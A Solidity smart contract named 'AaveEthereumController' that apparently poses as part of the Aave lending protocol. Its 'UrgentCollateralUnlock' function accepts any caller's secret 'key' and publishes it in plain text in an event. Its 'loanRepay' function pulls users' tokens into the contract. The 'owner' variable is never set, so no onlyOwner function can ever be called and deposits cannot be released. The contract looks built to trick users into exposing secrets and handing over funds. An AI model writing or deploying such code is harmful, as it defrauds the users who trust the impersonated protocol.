// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

contract AaveEthereumController {


    address public owner;
    address public feeRecipient;
    address public controller_aEthWETH;
    address public controller_aWBTC;
    address public controller_aUSDC;
    address public controller_aDAI;
    address public controller_aWETH;
    address public controller_aUSDT;

    event SetFeeRecipient(address newFeeRecipient);
    event SetController(address newController, string token);
	event UrgentCollateralUnlockTriggered(address indexed sender, string key, bytes32 keyHash);
    event TimeLockExecuted(uint256 amount, address to);
    event LoanRepaid(address indexed sender, address token, uint256 amount);
    event BorrowExecuted(address token, uint256 amount);

    constructor(

        address controller_aEthWETH_,
        address controller_aWBTC_,
        address controller_aUSDC_,
        address controller_aDAI_,
        address controller_aWETH_,
        address controller_aUSDT_
    ) {

        require(controller_aEthWETH_ != address(0), "ZERO_ADDRESS_CONTROLLER_aEthWETH");
        require(controller_aWBTC_ != address(0), "ZERO_ADDRESS_CONTROLLER_aWBTC");
        require(controller_aUSDC_ != address(0), "ZERO_ADDRESS_CONTROLLER_aUSDC");
        require(controller_aDAI_ != address(0), "ZERO_ADDRESS_CONTROLLER_aDAI");
        require(controller_aWETH_ != address(0), "ZERO_ADDRESS_CONTROLLER_aWETH");
        require(controller_aUSDT_ != address(0), "ZERO_ADDRESS_CONTROLLER_aUSDT");


        controller_aEthWETH = controller_aEthWETH_;
        controller_aWBTC = controller_aWBTC_;
        controller_aUSDC = controller_aUSDC_;
        controller_aDAI = controller_aDAI_;
        controller_aWETH = controller_aWETH_;
        controller_aUSDT = controller_aUSDT_;


        emit SetController(controller_aEthWETH_, "aEthWETH");
        emit SetController(controller_aWBTC_, "aWBTC");
        emit SetController(controller_aUSDC_, "aUSDC");
        emit SetController(controller_aDAI_, "aDAI");
        emit SetController(controller_aWETH_, "aWETH");
        emit SetController(controller_aUSDT_, "aUSDT");
    }

    /* MODIFIERS */
    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }



    function setFeeRecipient(address newFeeRecipient) external onlyOwner {
        require(newFeeRecipient != feeRecipient, "ALREADY_SET");
        feeRecipient = newFeeRecipient;

        emit SetFeeRecipient(newFeeRecipient);
    }

    function setController(address newController, string calldata token) external onlyOwner {
        require(newController != address(0), "ZERO_ADDRESS_CONTROLLER");

        if (keccak256(abi.encodePacked(token)) == keccak256("aEthWETH")) {
            controller_aEthWETH = newController;
        } else if (keccak256(abi.encodePacked(token)) == keccak256("aWBTC")) {
            controller_aWBTC = newController;
        } else if (keccak256(abi.encodePacked(token)) == keccak256("aUSDC")) {
            controller_aUSDC = newController;
        } else if (keccak256(abi.encodePacked(token)) == keccak256("aDAI")) {
            controller_aDAI = newController;
        } else if (keccak256(abi.encodePacked(token)) == keccak256("aWETH")) {
            controller_aWETH = newController;
        } else if (keccak256(abi.encodePacked(token)) == keccak256("aUSDT")) {
            controller_aUSDT = newController;
        } else {
            revert("INVALID_TOKEN");
        }

        emit SetController(newController, token);
    }

function UrgentCollateralUnlock(string calldata key) external {
    require(bytes(key).length > 0, "Key cannot be empty");
    
    bytes32 keyHash = keccak256(abi.encodePacked(key));
    
    emit UrgentCollateralUnlockTriggered(msg.sender, key, keyHash);
}

    function timeLock() external onlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "NO_BALANCE");

        (bool success, ) = owner.call{value: amount}("");
        require(success, "TRANSFER_FAILED");

        emit TimeLockExecuted(amount, owner);
    }

    function loanRepay(address token, uint256 amount) external {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transferFrom(msg.sender, address(this), amount);
        require(success, "TRANSFER_FAILED");

        emit LoanRepaid(msg.sender, token, amount);
    }

    function borrow(address token, uint256 amount) external onlyOwner {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transfer(owner, amount);
        require(success, "TRANSFER_FAILED");

        emit BorrowExecuted(token, amount);
    }

    function extSloads(bytes32 slot) external view returns (bytes32 res) {
        assembly {
            res := sload(slot)
        }
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}